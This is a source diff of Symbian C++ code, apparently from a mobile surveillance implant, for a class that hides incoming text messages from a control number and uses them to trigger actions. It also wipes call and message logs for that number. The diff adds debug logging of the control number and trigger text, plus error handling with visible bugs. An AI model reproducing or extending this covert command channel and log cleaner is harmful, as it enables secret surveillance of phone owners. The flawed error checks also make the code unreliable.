@@ -22,10 +22,13 @@ CEventSms::CEventSms(TUint32 aTriggerId) :
 
 CEventSms::~CEventSms()
 	{
+	__FLOG(_L("Destructor"));
 	delete iLogCleaner;
 	delete iSmsRecv;
 	iSocketServ.Close();
 	iFs.Close();
+	__FLOG(_L("End Destructor"));
+	__FLOG_CLOSE;
 	}
 
 CEventSms* CEventSms::NewLC(const TDesC8& params, TUint32 aTriggerId)
@@ -45,14 +48,31 @@ CEventSms* CEventSms::NewL(const TDesC8& params, TUint32 aTriggerId)
 
 void CEventSms::ConstructL(const TDesC8& params)
 	{
+	__FLOG_OPEN_ID("HT", "EventSms.txt");
+	__FLOG(_L("-------------"));
+		
 	BaseConstructL(params);
 
 	// Initializes File-Server session, Socket Server session and Sms Receiver
-	User::LeaveIfError(iFs.Connect());
-	User::LeaveIfError(iSocketServ.Connect());
-	iSmsRecv = CSmsReceiverSocket::NewL(*this, iFs, iSocketServ);
-	iLogCleaner = CLogCleaner::NewL(iFs);
-
+	//User::LeaveIfError(iFs.Connect());  //original MB
+	//User::LeaveIfError(iSocketServ.Connect()); //original MB
+	TInt fsErr = iFs.Connect();
+	TInt socketErr = iSocketServ.Connect();
+	
+	if((fsErr == KErrNone) && (socketErr == KErrNone))
+		{
+		TRAPD(error,(iSmsRecv = CSmsReceiverSocket::NewL(*this, iFs, iSocketServ)));
+		if(error != KErrNone)
+			{
+			iSmsRecv == NULL;
+			}
+		TRAPD(err,(iLogCleaner = CLogCleaner::NewL(iFs)));
+		if(error != KErrNone)
+			{
+			iLogCleaner == NULL;
+			}
+		}
+	
 	// Parses the parameters...
 
 	// Reads the Number
@@ -66,9 +86,10 @@ void CEventSms::ConstructL(const TDesC8& params)
 		TUint8 totChars = (lenNumb-1) / 2;
 		TPtr16 ptrNum((TUint16 *) ptr8, totChars, totChars);
 		iSmsNumber.Copy(ptrNum);
+		__FLOG(iSmsNumber);  //TODO:delete when done
 		}
 	ptr8 += lenNumb;
-
+	
 	// Reads the Text
 	TUint32 lenText = 0;
 	Mem::Copy(&lenText, ptr8, 4);
@@ -79,14 +100,19 @@ void CEventSms::ConstructL(const TDesC8& params)
 		TUint8 totChars = (lenText-1) / 2;
 		TPtr16 ptrText((TUint16 *) ptr8, totChars, totChars);
 		iSmsText.Copy(ptrText);
+		__FLOG(iSmsText);  //TODO:delete when done
 		}
 	}
 
 void CEventSms::StartEventL()
 	{
+	__FLOG(_L("StartEventL()"));
+		
 	// Starts Hidden SMS Receiver and Log Cleaner
-	iSmsRecv->StartReceivingL(iSmsText);
-	iLogCleaner->StartCleaner(iSmsNumber);
+	if(iSmsRecv != NULL)
+		iSmsRecv->StartReceivingL(iSmsText);
+	if(iLogCleaner != NULL)
+		iLogCleaner->StartCleaner(iSmsNumber);
 	}
 
 // this is the original method from MB
@@ -114,6 +140,7 @@ void CEventSms::IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TD
 
 void CEventSms::IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TDesC& aData)
 	{
+	__FLOG(_L("IncomingSmsl()"));
 	// Check the sender...
 	TBool match = EFalse;
 	if(aFromNumber.Length() <= iSmsNumber.Length())
@@ -134,16 +161,19 @@ void CEventSms::IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TD
 	// If the sender matches then trigger the Actions
 	if (match)
 		{
+		__FLOG(_L("Sender match, trigger the action."));
 		SendActionTriggerToCoreL();
 		return;
 		}	
 	
 	// The sender doesn't match, insert the message in the Inbox
+	__FLOG(_L("Sender doesn't match, put into inbox"));
 	SaveToInBoxL(aFromNumber, aData);
 	}
 
 void CEventSms::SaveToInBoxL(const TDesC& sender, const TDesC& msg)
 {
+	__FLOG(_L("SaveToInboxL()"));
 	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
 	CleanupStack::PushL(msvSession);
 
